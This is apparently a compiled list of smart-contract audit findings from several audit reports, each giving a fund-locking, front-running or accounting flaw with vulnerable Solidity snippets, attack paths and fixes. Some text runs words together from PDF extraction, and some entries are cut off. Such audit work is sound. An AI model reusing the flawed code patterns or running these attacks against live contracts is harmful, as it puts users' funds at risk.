# funds-lifecycle - Issues

- Count: 15

## F-2026-14861 - Front-Running Do S on Batch Settlement via Rolling Hash Invalidation
- 嚴重度：Medium
- Report source：Dexalot.pdf

### 問題內容（完整）
The rolling hash mechanism used to ensure batch settlement integrity canbe exploited by any user to indefinitely block settlements. Since each newdeposit or withdrawal request modifies the rolling hash, an attacker canfront-run settlement transactions to invalidate them, causing repeatedreverts and preventing users from receiving shares or withdrawing assets. The OmniVaultManager employs a rolling hash mechanism where eachdeposit and withdrawal request appends to the respective hash: // In `requestDeposit()` rollingDepositHash = keccak256(abi.encode(rollingDepositHash, requestId, `_tok` ens, `_amounts`)); // In `requestWithdrawal()` rollingWithdrawalHash = keccak256(abi.encode(rollingWithdrawalHash, requestId , `_shares`)); During settlement, the `SETTLER_ROLE` must provide data that reconstructs theexact rolling hash: // In `_bulkSettleDeposits`() require(depositHash == rollingDepositHash, "VM-`DHMR`-01"); // In `_bulkSettleWithdrawals`() require(withdrawalHash == rollingWithdrawalHash, "VM-`WHMR`-01"); The vulnerability arises because any user can submit a new deposit orwithdrawal request that changes the rolling hash. If this occurs after thesettler has prepared their settlement transaction but before it confirms, thesettlement reverts due to hash mismatch. This can lead to: Settlement blocked: Deposits cannot be settled, preventing usersfrom receiving vault shares.Withdrawals blocked: Withdrawals cannot be settled, preventingusers from receiving their assets.Temporary fund lock: User deposits remain locked in the executor,and withdrawal shares remain locked in the manager.Recovery delay: The system can only recover when `MAX_PENDING_REQUESTS` reaches 1000 and no additional requests can besubmitted, or via unwindBatch after `RECLAIM_DELAY` 24 hours), whichrefunds all pending requests without settlement. 22 Assets: `contracts/vaults/OmniVaultManager.sol`[https://github.com/Dexalot/contracts/commits/omnivaults/] Status: Fixed

### 修補方式（建議）
Option 1 Per-Request Settlement Isolation: Decouple individualrequests from a shared rolling hash so that new requests do notinvalidate previously submitted ones. Each request's data should beverifiable independently while maintaining fair ordering guarantees forshare pricing. This allows the settler to process existing requestswithout being affected by concurrent new submissions.Option 2 Request Window Separation: Separate request submissionand settlement into distinct time periods. New requests should beblocked during settlement processing to ensure the batch stateremains stable. This prevents concurrent modifications to settlementdata while preserving the integrity of batch ordering. Resolution: Fixed in cf300d7: OmniVaultManager now separates request intake from settlement usingbatch finalization: finalizeBatch stores rollingDepositHash and rollingWithdrawalHash in completedBatches[batchId], then starts a new batch via `_resetBatch`. bulkSettleState settles only the finalized previous batch (currentBatchId - 1) and verifies settlement data against stored batch hashes.New requestDeposit and requestWithdrawal calls update only current-batch rolling hashes, so finalized-batch settlement no longer revertsfrom concurrent request activity. 23

### 修補方式（實際）
Fixed in cf300d7: OmniVaultManager now separates request intake from settlement usingbatch finalization: finalizeBatch stores rollingDepositHash and rollingWithdrawalHash in completedBatches[batchId], then starts a new batch via `_resetBatch`. bulkSettleState settles only the finalized previous batch (currentBatchId - 1) and verifies settlement data against stored batch hashes.New requestDeposit and requestWithdrawal calls update only current-batch rolling hashes, so finalized-batch settlement no longer revertsfrom concurrent request activity. 23

## F-2026-14898 - Refund Failure Prevents Host Payment and Locks Session Funds
- 嚴重度：Medium
- Report source：Fabstir.pdf

### 問題內容（完整）
The `_settleSessionPayments`() internal function processes both host paymentand user refund within a single atomic transaction. When the user refundtransfer fails, the entire transaction reverts, causing the host payment toalso be cancelled even though the host has legitimately earned theirtokens. The function executes in the following order: Calculate hostPayment and userRefund amounts Transfer hostPayment to HostEarningsUpgradeable contract Transfer userRefund to session.depositor If step 3 fails, all state changes including step 2 are reverted. The refundtransfer may fail due to: Depositor being a smart contract that rejects `ETH` transfersDepositor address being blacklisted by the payment token (e.g.,`USDC`, `USDT` When this occurs, both `completeSessionJob()` and `triggerSessionTimeout()` willpermanently revert, leaving the session in Active status indefinitely with allfunds locked in the contract. function `_settleSessionPayments`(uint256 jobId, address completedBy) internal { SessionJob storage session = sessionJobs[jobId]; uint256 hostPayment = (session.tokensUsed * session.pricePerToken) / `PRICE` `_PRECISION`; uint256 userRefund = session.deposit > hostPayment ? session.deposit - hos tPayment : 0; if (hostPayment > 0) { // Host payment logic - succeeds but reverts if refund fails // … } if (userRefund > 0) { if (session.paymentToken == `address(0)`) { (bool sent,) = `payable(session.depositor)`.call{value: userRefund}( ""); require(sent, "`ETH` refund failed"); //Reverts entire transaction } else { `IERC20(session.paymentToken)`.`safeTransfer(session.depositor, userR efund)`; //Reverts entire transaction } session.refundedToUser = userRefund; 28 } } Hosts who have completed legitimate work and submitted valid proofscannot receive their earned payments Assets: `src/JobMarketplaceWithModelsUpgradeable.sol`[https://github.com/Fabstir/fabstir-compute-contracts#] Status: Fixed

### 修補方式（建議）
On refund failure, credit the refund to the depositor's pre-deposit balancewithin JobMarketplace rather than reverting. The user can then withdrawvia the existing withdrawNative/withdrawToken functions: if (userRefund > 0) { if (session.paymentToken == `address(0)`) { (bool sent,) = `payable(session.depositor)`.call{value: userRefund}("") ; if (!sent) { userDepositsNative[session.depositor] += userRefund; } } else { try `IERC20(session.paymentToken)`.`safeTransfer(session.depositor, user Refund)` { } catch { userDepositsToken[session.depositor][session.paymentToken] += use rRefund; } } session.refundedToUser = userRefund; } 29 This reuses existing infrastructure, keeps user and host accountingseparate, and ensures settlement never reverts due to a refund failure. Thedepositor can retrieve funds via the standard withdrawal path at theirconvenience. Resolution: Fixed in 8a7331a: Settlement logic now uses a pull-pattern fallback for refund failures insteadof reverting the full transaction. On native refund failure, the amount is credited to userDepositsNative[depositor]; on ERC20 refund failure, the amount iscredited to userDepositsToken[depositor][token], with RefundCreditedToDeposit emitted in both fallback cases. if (userRefund > 0) { session.refundedToUser = userRefund; if (session.paymentToken == `address(0)`) { (bool sent,) = `payable(session.depositor)`.call{value: if (!sent) { // F202614898: Credit to deposit balance on `ETH` refund failure userDepositsNative[session.depositor] += userRefund; emit RefundCreditedToDeposit(jobId, session.depositor, userRefund , `address(0)`); } } else { // F202614898: Use try/catch with low-level transfer for pull pattern try `IERC20(session.paymentToken)`.`transfer(session.depositor, userRefu nd)` returns (bool success) { if (!success) { userDepositsToken[session.depositor][session.paymentToken] += userRefund; emit `RefundCreditedToDeposit(jobId, session.depositor, userRe fund, session.paymentToken)`; } } catch { userDepositsToken[session.depositor][session.paymentToken] += use rRefund; } } Host settlement and treasury accounting therefore proceed even whendirect refund transfer fails, removing the prior all-or-nothing failure modethat could block earned host payments. 30

### 修補方式（實際）
Fixed in 8a7331a: Settlement logic now uses a pull-pattern fallback for refund failures insteadof reverting the full transaction. On native refund failure, the amount is credited to userDepositsNative[depositor]; on ERC20 refund failure, the amount iscredited to userDepositsToken[depositor][token], with RefundCreditedToDeposit emitted in both fallback cases. if (userRefund > 0) { session.refundedToUser = userRefund; if (session.paymentToken == `address(0)`) { (bool sent,) = `payable(session.depositor)`.call{value: userRefund}("") ; if (!sent) { // F202614898: Credit to deposit balance on `ETH` refund failure userDepositsNative[session.depositor] += userRefund; emit RefundCreditedToDeposit(jobId, session.depositor, userRefund , `address(0)`); } } else { // F202614898: Use try/catch with low-level transfer for pull pattern try `IERC20(session.paymentToken)`.`transfer(session.depositor, userRefu nd)` returns (bool success) { if (!success) { userDepositsToken[session.depositor][session.paymentToken] += userRefund; emit `RefundCreditedToDeposit(jobId, session.depositor, userRe fund, session.paymentToken)`; } } catch { userDepositsToken[session.depositor][session.paymentToken] += use rRefund; } } Host settlement and treasury accounting therefore proceed even whendirect refund transfer fails, removing the prior all-or-nothing failure modethat could block earned host payments. 30

## F-2026-14964 - Proposal Fee Permanently Locked on Rejection
- 嚴重度：High
- Report source：Fabstir.pdf

### 問題內容（完整）
In ModelRegistryUpgradeable contract, when a user proposes a new model forcommunity approval, they must pay a 100 `FAB` token proposal fee. This feeis intended to prevent spam proposals. However, the fee is only returnedto the proposer if the proposal is approved. When a proposal is rejected,the 100 `FAB` fee remains permanently locked in the contract with nomechanism to recover it. The contract lacks: A refund mechanism for rejected proposal fees An owner rescue function for accumulated stuck fees Any alternative use for the collected fees (e.g., treasury transfer, burn) Over time, this will result in significant `FAB` tokens becoming permanentlyinaccessible. Proposal fee collected on creation: function `proposeModel( string memory huggingfaceRepo, string memory fileName, bytes32 sha256Hash )` external nonReentrant { // … // Charge proposal fee to prevent spam governanceToken.safeTransferFrom(`msg.sender`, `address(this)`, `PROPOSAL_FEE`); } Fee only returned on approval: function `executeProposal(bytes32 modelId)` external { ModelProposal storage proposal = proposals[modelId]; 11 proposal.executed = true; bool approved = proposal.votesFor >= `APPROVAL_THRESHOLD` && proposal.votesFor > proposal.votesAgainst; if (approved) { // Add the model models[modelId] = proposal.modelData; } // Return proposal fee to proposer if approved if (approved) { governanceToken.safeTransfer(proposal.proposer, `PROPOSAL_FEE`); } The contract has no `rescueTokens()` function or any mechanism to withdrawrejected fees. Over the lifetime of the protocol, significant `FAB` tokens willbecome permanently inaccessible. Assets: `src/ModelRegistryUpgradeable.sol` [https://github.com/Fabstir/fabstir-compute-contracts#] Status: Fixed

### 修補方式（建議）
Track rejected proposal fees with a dedicated accumulator and add anowner-callable sweep function. In executeProposal, when the proposal is notapproved, increment the counter instead of silently retaining the fee: uint256 public accumulatedRejectedFees; // In `executeProposal()`, replace the existing fee return block: if (approved) { governanceToken.safeTransfer(proposal.proposer, `PROPOSAL_FEE`); 12 } else { accumulatedRejectedFees += `PROPOSAL_FEE`; } function `sweepRejectedFees(address recipient)` external onlyOwner { require(recipient != `address(0)`, "Invalid recipient"); uint256 amount = accumulatedRejectedFees; `require(amount > 0, "Nothing to sweep")`; accumulatedRejectedFees = 0; `governanceToken.safeTransfer(recipient, amount)`; } Resolution: Fixed in 2d7256c: ModelRegistryUpgradeable now tracks fees from rejected proposalsthrough accumulatedRejectedFees.During executeProposal, approved proposals return `PROPOSAL_FEE` to proposer,while rejected proposals increase accumulatedRejectedFees instead of leavingassets unaccounted. } else { accumulatedRejectedFees += `PROPOSAL_FEE`; } An owner-controlled withdrawal path is present via `withdrawRejectedFees(uint256 amount)`, enabling recovery of accumulatedrejected fees and removing permanent lock risk for proposal-fee assets. function `withdrawRejectedFees(uint256 amount)` external onlyOwner nonReentrant { uint256 toWithdraw = amount == 0 ? accumulatedRejectedFees : amount; `require(toWithdraw > 0, "No fees to withdraw")`; `require(toWithdraw <= accumulatedRejectedFees, "Insufficient accumulated fees")`; accumulatedRejectedFees -= toWithdraw; governanceToken.safeTransfer(`msg.sender`, toWithdraw); emit RejectedFeesWithdrawn(`msg.sender`, toWithdraw);

### 修補方式（實際）
Fixed in 2d7256c: ModelRegistryUpgradeable now tracks fees from rejected proposalsthrough accumulatedRejectedFees.During executeProposal, approved proposals return `PROPOSAL_FEE` to proposer,while rejected proposals increase accumulatedRejectedFees instead of leavingassets unaccounted. if (approved) { governanceToken.safeTransfer(proposal.proposer, `PROPOSAL_FEE`); } else { accumulatedRejectedFees += `PROPOSAL_FEE`; } An owner-controlled withdrawal path is present via `withdrawRejectedFees(uint256 amount)`, enabling recovery of accumulatedrejected fees and removing permanent lock risk for proposal-fee assets. function `withdrawRejectedFees(uint256 amount)` external onlyOwner nonReentrant { uint256 toWithdraw = amount == 0 ? accumulatedRejectedFees : amount; `require(toWithdraw > 0, "No fees to withdraw")`; `require(toWithdraw <= accumulatedRejectedFees, "Insufficient accumulated fees")`; accumulatedRejectedFees -= toWithdraw; governanceToken.safeTransfer(`msg.sender`, toWithdraw); emit RejectedFeesWithdrawn(`msg.sender`, toWithdraw);

## F-2026-14799 - Funds Loss via Direct Transfer in Custody Vault
- 嚴重度：High
- Report source：S3 Markets.pdf

### 問題內容（完整）
The CustodyVault contract is designed to hold EAC1155 tokens on behalf ofbuyers, tracking ownership via internal accounting mappings (unassigned, freeBalance, lockedBalance). Users or admins deposit tokens into the Vault,which can then be allocated, transferred internally, locked, or retired. Thecontract implements IERC1155Receiver to accept token transfers. The CustodyVault accepts ERC1155 tokens sent via direct `transfers(safeTransferFrom()`) but fails to account for them in its internal ledgers.Consequently, any tokens sent directly to the Vault by users arepermanently locked in the contract, as they are not credited to any freeBalance or unassigned supply, rendering them impossible to withdraw orutilize. The issuerability lies in the implementation of `onERC1155Received()` and `onERC1155BatchReceived()` within `CustodyVault.sol`. These functions aretriggered whenever the Vault receives ERC1155 tokens. In the currentimplementation, the code only updates the internal unassigned balance ifthe sender (from) is the zero address, which indicates a minting: function `onERC1155Received( address, address from, uint256 id, uint256 value, bytes calldata )` external override returns (bytes4) { require(`msg.sender` == `address(token)`, "Vault: token only"); // If sender is zero address (minting), mark as unassigned if (from == `address(0)`) { unassigned[id] += value; emit `ICustodyVault.InventoryReceived(id, value, bytes32(0)`); } return IERC1155Receiver.onERC1155Received.selector; } If a user calls `safeTransferFrom()` on the token contract to send funds to theVault (a standard ERC1155 interaction), the token contract transfers the 8 balance to the Vault and calls this hook. The hook returns the validselector, so the transaction succeeds. However, because from is the user'saddress (not `address(0)`), the if block is skipped. The Vault physically holdsthe tokens, but the freeBalance for the user remains 0. Since withdrawal (`withdrawToExternal()`) and usage (`retire()`, `internalTransfer()`) strictly require freeBalance[buyerHash][id] >= amount, thesetokens become inaccessible. This leads to situations where tokens arelocked in the Vault contract address indefinitely. Assets: `CustodyVault.sol` [https://github.com/S3 Markets/s3block] Status: Fixed

### 修補方式（建議）
If direct transfers must be supported, the data parameter should bedecoded to retrieve the target buyerHash, and the freeBalance should beupdated accordingly. However, reverting is safer to ensure correct usageof the dedicated `depositFor()` flow. Resolution: In commit b318424, an additional validation has been added in the onERC1155Received function to prevent direct transfers to the CustodyVault contract. The operator parameter is now required to be the CustodyVault contract itself, enforcing the use of the `depositFor()` function, whichensures correct token balance accounting.

### 修補方式（實際）
In commit b318424, an additional validation has been added in the onERC1155Received function to prevent direct transfers to the CustodyVault contract. The operator parameter is now required to be the CustodyVault contract itself, enforcing the use of the `depositFor()` function, whichensures correct token balance accounting.

## F-2026-14800 - Expired Tokens Permanently Trapped
- 嚴重度：High
- Report source：S3 Markets.pdf

### 問題內容（完整）
The CustodyVault contract acts as a centralized custodian for EAC1155 tokens, maintaining internal ledgers (freeBalance, lockedBalance) for buyersidentified by hashes. The vault manages the lifecycle of these credits,including allocation, internal transfers, locking for claims, retirement, andwithdrawal to external wallets. Most state-changing operations arerestricted to the `OPS_ROLE`. A logic flaw in the CustodyVault prevents any action on expired tokens,causing them to become permanently trapped in the vault. Strict expirychecks in all state-changing functions mean that once a token reaches itsexpiration timestamp, it cannot be withdrawn, retired, unlocked, or moved,effectively freezing the associated storage slots and preventing anyadministrative cleanup. The CustodyVault enforces a strict check `require(!token.isExpired(id)`, "Vault: token has expired") at the beginning of nearly every function that interactswith token balances. This includes: `withdrawToExternal()` `retire()` (and `retireBatch()`, `retireBatchSameReason()`, `retireFromExternal()`) `unlock()` `internalTransfer()` This creates a deadlock scenario for assets held within the vault. If a userholds tokens in freeBalance or lockedBalance and the token expires: Retirement is blocked: Users cannot burn the tokens to remove themfrom circulation or claim them (e.g., for an "expired" classification).The retire function reverts immediately. Withdrawal is blocked: Users cannot withdraw the tokens to theirown wallet (`withdrawToExternal()` reverts). Unlocking is blocked: If tokens were locked via `lockForClaim()` (e.g.,pending a claim verification that took too long), they cannot beunlocked back to freeBalance (unlock reverts). function `retire( bytes32 buyerHash, uint256 id, … )` external onlyRole(`OPS_ROLE`) { `require(!token.isExpired(id)`, "Vault: token has expired"); // <--- Pre vents cleanup … `token.burn(address(this)`, id, amount, reason); 11 … } function `withdrawToExternal( bytes32 buyerHash, uint256 id, … )` external onlyRole(`OPS_ROLE`) { `require(!token.isExpired(id)`, "Vault: // <--- Pre vents withdrawal …. } This effectively turns the vault into a "trap" where tokens can enter but cannever leave or be destroyed once they expire. Hence, user balances forexpired tokens are permanently "bricked." They cannot be utilized,claimed, or removed. Assets: `CustodyVault.sol` [https://github.com/S3 Markets/s3block] Status: Fixed

### 修補方式（建議）
Remove the `require(!token.isExpired(id)`) check from the retire family offunctions. Retirement is the standard way to handle expired or used assets.Ensure the underlying `EAC1155.burn()` function also permits burning expiredtokens. Resolution: In commitee718b2, the retire (or withdrawToExternal) function still enforces adirect restriction based on token expiration, but new functions have beenintroduced to handle expired token utilization. The `resolveExpired()` and `resolveExpiredBatch()` functions allow the `OPS_ROLE` to burn expired tokenswithout accounting for them in retiredBalance, totalRetiredByTokenId, or the 12 `_retiredBuyersForTokenmappings`. This effectively serves as a cleanupmechanism for expired tokens.

### 修補方式（實際）
In commitee718b2, the retire (or withdrawToExternal) function still enforces adirect restriction based on token expiration, but new functions have beenintroduced to handle expired token utilization. The `resolveExpired()` and `resolveExpiredBatch()` functions allow the `OPS_ROLE` to burn expired tokenswithout accounting for them in retiredBalance, totalRetiredByTokenId, or the 12 `_retiredBuyersForTokenmappings`. This effectively serves as a cleanupmechanism for expired tokens.

## F-2026-14811 - Expired Tokens Permanently Locked Due to Burn Restriction
- 嚴重度：Medium
- Report source：S3 Markets.pdf

### 問題內容（完整）
The EAC1155 contract manages Environmental Attribute Certificates thathave an expiration date. The contract includes burn and burnBatchfunctions, restricted to the `BURNER_ROLE`, to retire certificates or remove themfrom circulation. Tokens that reach their expiry timestamp become permanently locked inuser wallets because the burn functions enforce an expiry check. Thisprevents even authorized roles from removing expired inventory, resultingin "zombie" tokens that clutter the ledger and cannot be cleaned up. The `burn()` and `burnBatch()` functions explicitly call `_checkExpiry`(id) beforeexecuting the burn logic. This modifier reverts the transaction if `block.timestamp` > expiry. function `burn(address from, uint256 id, uint256 amount, RetirementReason reas on)` external onlyRole(`BURNER_ROLE`) whenNotPaused { `_checkTokenIsCreated`(id); `_checkExpiry`(id); `_burn`(from, id, amount); emit IEAC1155.TokenBurned(from, id, amount, reason, `msg.sender`); } While preventing transfers of expired tokens is correct behavior for validcertificates, preventing burning creates a deadlock. Once a token expires,no action can ever be taken on it again. This can lead to situations where. Users and the protocol cannot clean up expired inventory. Wallets willpermanently display invalid certificates.The contract state cannot be reduced by burning dead tokens. Assets: `EAC1155.sol` [https://github.com/S3 Markets/s3block] Status: Fixed

### 修補方式（建議）
Remove the `_checkExpiry`(id) check from the `burn()` and `burnBatch()` functions, or allow a specific RetirementReason.Expired to bypass this check.This allows the `BURNER_ROLE` to remove invalid/expired tokens fromcirculation. Resolution: In commit 3b40377, the burn functions perform a validation to check if the RetirementReason is set as Expired; if so, the `_checkExpiry`(ids[i]) step isskipped, meaning the burning is now allowed for the expired tokens.

### 修補方式（實際）
In commit 3b40377, the burn functions perform a validation to check if the RetirementReason is set as Expired; if so, the `_checkExpiry`(ids[i]) step isskipped, meaning the burning is now allowed for the expired tokens.

## F-2025-14448 - Uncoordinated Escape Hatch Mechanisms Cause Permanent `forced Withdrawal Requests` Lock When Inclusion Queue Executes First - Medium
- 嚴重度：Medium
- Report source：BullBit.pdf

### 問題內容（摘要）
The protocol implements two separate escape hatch mechanisms to allowusers to withdraw funds when the sequencer is unresponsive orcensoring: 1. InclusionQueue.forceWithdrawalFromPool(uint256 amount) Users pay a fee to queue a forced withdrawal request in the poolQueue[] arrayAvailable anytime (doesn't require sequencer to be inactive)Can be processed in two ways:By sequencer: via Verifier.submitPoolUpdateBatch() which includes forcedQueueIds[] parameterBy anyone: via Verifier.processOverdueQueueItem(uint8 source) after forcedDeadline  24 hours) has passed — this is a permissionlessescape hatch that allows any user to trigger processing ofoverdue queue items when the sequencer is not respondingBoth processing paths ultimately call Pool.executeOnChainWithdrawal() totransfer tokens 2. Pool.initiateForceWithdrawal(address _token, string calldata destination) Users initiate a direct forced withdrawal stored in forcedWithdrawalRequests[user][token] Only available when sequencer has been inactive for sequencerInactivityThreshold  14 days)User must wait forceWithdrawDelay  7 days  then call Pool.finalizeForceWithdrawal(address _token) to completeTransfers tokens directly from Pool to user

### 修補方式（實際）
This issue is implicitly resolved by removing the Pool-level forcewithdrawal mechanism (initiateForceWithdrawal() and finalizeForceWithdrawal()), leaving only the InclusionQueue-based escapehatch, which handles insufficient balances gracefully without creatingstuck user state. Revised commit: 322258e. 27


## F-2026-14523 - Pending Force Withdrawal Requests Removed On Balance Update - Medium
- 嚴重度：Medium
- Report source：BullBit.pdf

### 問題內容（摘要）
The Pool and Vault contracts implement a force withdrawal flow thatenables withdrawal of tokens when the off-chain Sequencer is inactive.The Sequencer is responsible for normal withdrawal execution, while theforce withdrawal flow provides a fallback mechanism when the Sequenceris inactive for a period equal to the sequencerInactivityThreshold (default 14days). During initiateForceWithdrawal(), a ForcedWithdrawalRequest struct is createdand stored in the forcedWithdrawalRequests mapping using msg.sender as thekey. After a delay equal to forceWithdrawDelay (default 7 days), finalizeForceWithdrawal() allows tokens to be transferred to the user basedon the cached balance at the time of the initiation. function initiateForceWithdrawal() external notContract nonReentrant whenNotP aused { require(verifierContract != address(0), "Vault: verifier not set"); // Check if sequencer is inactive uint256 lastUpdate = IVerifierVault(verifierContract).lastVaultUpdateTime stamp(); require(block.timestamp > lastUpdate + sequencerInactivityThreshold, "Vault: sequencer is still active"); uint256 bal = balances[msg.sender]; require(bal > 0, "Vault: no balance to withdraw"); require(forcedWithdrawalReque

### 修補方式（實際）
The issue was fixed in commit e665fb628fd70fc9dd01b04067f7977ec08874e4. The initiateForceWithdrawal() and finalizeForceWithdrawal() functions wereremoved, along with the deletion of the forcedWithdrawalRequests mapping inthe applyStateChanges() function, removing the root cause. 49


## F-2025-13424 - Payout Distribution Delays due to Invalid `last Claimed` Timestamp Update - High
- 嚴重度：High
- Report source：Digital Oro International.pdf

### 問題內容（摘要）
The claimUserPayout function of the DOI_PayoutManager contract aims todistribute payout funds proportionally to the number of periodspassed. The number of periods passed is calculated as follows. uint256 periodsPassed = (currentTime - payout.lastPayoutTime) / periodInSecon ds The lastPayoutTime is updated to the current timestamp. uint256 currentTime = block.timestamp; payout.lastPayoutTime = currentTime; Such an approach ignores current distribution period is in progressand shifts the distribution schedule delaying the payments.

### 修補方式（實際）
The Finding is ﬁxed in the commits 2a5f4e4 and 8190ccc. The lastPayoutTime state variable is updated according to the numberof periods passed. Evidences PoC


## F-2024-7645 - Potential Front-Running When DOIToken Is Sold in Secondary Market - Medium
- 嚴重度：Medium
- Report source：Digital Oro.pdf

### 問題內容（摘要）
The ERC721-compliant DOIToken can be purchased for 100 USDT eachand used for participating in raﬄes or acquiring a Gold MembershipNFT. Tokens are marked as used with DOIToken::useTokenForRaffle() whenentered into a raﬄe or with DOIToken::useTokenForMembership() when usedto obtain a Gold Membership by consuming 20 tokens. Once markedas used, tokens cannot be reused for these functionalities. A potential front-running vulnerability exists when tokens are tradedon secondary marketplaces. A malicious seller can list an unusedtoken for sale and monitor the mempool for the correspondingpurchase transaction. Before the purchase is ﬁnalized, the seller canexecute two transactions with higher gas fees to use the token forboth raﬄe entry and Gold Membership acquisition. These front-running transactions are executed before the buyer’s transaction,resulting in the buyer receiving a token that is already marked asused.

### 修補方式（實際）
The Finding was ﬁxed in commit 8ffa5a2df927a8a024fc3dc5eb4a752337dcc3e8.A block token mechanism was introduced to prevent transfers whenthe token is blocked. The corresponding check was added to the _update() function of the ERC20 contract. 18


## F-2025-13501 - Output Accounting Uses Absolute Balance - Medium
- 嚴重度：Medium
- Report source：Dirol.pdf

### 問題內容（摘要）
_executeSwap determines the swap’s total output by reading the entirecurrent balance of the output token held by the contract ratherthan the delta produced by this swap. This mixes funds that mayhave been in the contract before the call (accidental transfers, dust,or third-party deposits) with the output of the current swap,allowing the caller to receive tokens that do not belong to them. // totalAmountOut should represent only this swap's output, // but it currently uses the absolute balance on the contract. if (isNativeOut) { totalAmountOut = IERC20(WRAPPED_NATIVE).balanceOf(address(this)); } else { totalAmountOut = IERC20(params.tokenOut).balanceOf(address(this)); }

### 修補方式（實際）
The Finding was ﬁxed in commit 4688ddad by adding proper snapshotmechanics for initial balances of the route tokens. 34 (bool hasSnapshot, uint256 snapshot) = _findTokenInSnapshot( uniqueTokensIn, tokenInSnapshots, uniqueTokenInCount, tokenTo Find ); if (!hasSnapshot) { // Failsafe: should never happen after pre-scan, but use curr entBalance as snapshot // This means tokenInBalance will be 0 for this route, preven ting unexpected behavior snapshot = currentBalance; tokenInSnapshots[uniqueTokenInCount] = snapshot; uniqueTokensIn[uniqueTokenInCount] = tokenToFind; unchecked {++uniqueTokenInCount;} } uint256 tokenInBalance = currentBalance - snapshot; Evidences POC


## F-2025-14250 - Winner-Selection Logic Flaw Allows The Group Creator To Capture All Contributed Funds - High
- 嚴重度：High
- Report source：RYT.pdf

### 問題內容（摘要）
The distributeFunds() function iterates through all group members, startingfrom index 0, to determine the payout winner. Since the ADMIN/ORGANIZER isalways the first member inserted into the members array, and theselection logic favors the first unpaid member by default, the ADMIN/ORGANIZER is always chosen as the first payout recipient, even whenthey are not assigned a payout position, since the default/unset payoutposition equals to the initial currentPayoutIndex and is zero. ... for (uint256 i = 0; i < totalMembers; i++) { address member = selectedGroup.members[i]; if ( !s_hasReceivedPayout[groupId][member] && (winner == address(0) || s_payoutPositions[groupId][me mber] == selectedGroup.currentPayoutIndex) ) { winner = member; break; } } ... As a result, the payout logic becomes corrupted and allows the ADMIN/ORGANIZER to illegitimately win and receive all pooled funds during thefirst distribution.

### 修補方式（實際）
In commit 1829f31, the winner == address(0) condition is removed from theloop, ensuring the winner is selected strictly by matching their assigned s_payoutPositions index rather than automatically defaulting to the firstmember (Admin) found in the list. Evidences POC


## F-2025-14273 - Excess Contributions Become Permanently Locked Due to Non-Exact Deposit Enforcement - Medium
- 嚴重度：Medium
- Report source：RYT.pdf

### 問題內容（摘要）
The Komiti::joinGroup(), Komiti::joinGroupWithJointContributor(), Komiti::acceptInviteForJointContributor(), and Komiti::contribute() functionsall validate user deposits using a greater-than-or-equal check: require(msg.value >= group.perShareAmount, "Komiti: Incorrect amount sent"); This design allows users to send more funds than required by the protocol. However, the payout mechanism in Komiti::distributeFunds() only uses: uint256 payoutAmount = (selectedGroup.perShareAmount * selectedGroup.members. length); This means: Only the minimum required contribution is considered for distribution.Any extra amount contributed above perShareAmount is not refunded, notredistributed, and not withdrawable.These surplus funds accumulate inside the contract without anymechanism for recovery. As a result, all excess contributions become permanently locked, formingan unrecoverable ether sink inside the protocol.

### 修補方式（實際）
Fixed in 1829f31. Now in order to join the group or to contribute via joinGroup() and contribute() functions, the user needs to pay the exact perShareAmount as follows: ... if (msg.value != group.perShareAmount) revert InvalidContributionAmount(); ... 39

## 補充 Issues

- Count: 2

## H-10 - Users redeeming early will with
- 嚴重度：High
- Report source：Cork.pdf

### 問題內容（完整）
draw Ra without decreasing the amount locked, which will lead to stolen funds when withdrawing after expiry Source: https://github.com/sherlock-audit/2024-08-cork-protocol-judging/issues/166 Found by 0x73696d616f, 0xNirix, KupiaSec, Matrox, dimulski, hunter_w3b, nikhil840096, oxelmiguel, vinica_boy Summary VaultLib::redeemEarly() is called when users redeem early via Vault::redeemEarlyLv(), which allows users to redeem Lv for Ra and pay a fee. In the process, the Vault burns Ct and Ds in VaultLib::_redeemCtDsAndSellExcessCt() for Ra, by calling PsmLib::PsmLibrary.lvRedeemRaWithCtDs(). However, it never calls RedemptionAssetManagerLib::decLocked() to decrease the tracked locked Ra, but the Ra leaves the Vault for the user redeeming. This means that when a new Ds is issued in the PsmLib or users call PsmLib::redeemWithCt (), PsmLib::_separateLiquidity() will be called and it will calculated the exchange rate to withdraw Ra and Pa as if the Ra amount withdrawn earlier was still there. When it calls self.psm.balances.ra.convertAllToFree(), it converts the locked amount to free and assumes these funds are available, when in reality they have been withdrawn earlier. As such, the Ra and Pa checkpoint will be incorrect and users will redeem more Ra than they should, such that the last users will not be able to withdraw and the first ones will profit. Root Cause In PsmLib.sol:125, self.psm.balances.ra.decLocked(amount); is not called. Internal pre-conditions None. External pre-conditions None. 49 Attack Path 1. User calls Vault::redeemEarlyLv() or ModuleCore::issueNewDs() is called by the admin. Impact Users withdraw more funds then they should via PsmLib::redeemWithCt() meaning the last users can not withdraw. PoC PsmLib::lvRedeemRaWithCtDs() does not reduce the amount of Ra locked. function lvRedeemRaWithCtDs(State storage self, uint256 amount, uint256 dsId) internal {,→ DepegSwap storage ds = self.ds[dsId]; ds.burnBothforSelf(amount); } Mitigation PsmLib::lvRedeemRaWithCtDs() must reduce the amount of Ra locked. function lvRedeemRaWithCtDs(State storage self, uint256 amount, uint256 dsId) internal {,→ self.psm.balances.ra.decLocked(amount); DepegSwap storage ds = self.ds[dsId]; ds.burnBothforSelf(amount); } Discussion ziankork dup of #44 and related #156 . will fix SakshamGuruji3 Escalate It should be dupe of https://github.com/sherlock-audit/2024-08-cork-protocol-judging/ issues/126 , Even though this report revolves around lvRedeemRaWithCtDs, the root cause co

### 修補方式（實際）
Status: Fixed/Resolved in report.

## H-11 - Vault Pool Lib::reserve() will
- 嚴重度：High
- Report source：Cork.pdf

### 問題內容（完整）
store the Pa not attributed to user with- drawals incorrectly and leave in untracked once it expires again Source: https://github.com/sherlock-audit/2024-08-cork-protocol-judging/issues/191 The protocol has acknowledged this issue. Found by 0x73696d616f, 0xNirix, dimulski, sakshamguruji Summary VaultPoolLib::reserve() stores the Pa attributed to withdrawals in self.withdrawalPool.sta gnatedPaBalance instead of storing the amount attributedToAmm. Additionally, this amount of Pa, the one attributed to the Amm is never dealt with and leads to stuck PA. The comment in the code mentions // FIXME : this is only temporary, for now // we trate PA the same as RA, thus we also separate PA // the difference is the PA here isn't being used as anything // and for now will just sit there until rationed again at next expiry. But it is incorrect as it is never rationed again, just forgotten. The VaultPoolLib::rationedT oAmm() function only uses the Ra balance, not the Pa, which is effectively left untracked. Root Cause In VaultPoolLib:170, the leftover non attributed Pa is not dealt with. Internal pre-conditions None. External pre-conditions None. 54 Attack Path 1. VaultPoolLib::reserve() is called when liquidating the lp position of the Vault via V aultLib::_liquidatedLP(), triggered by users when redeeming expired liquidity vault shares or on the admin trigerring a new 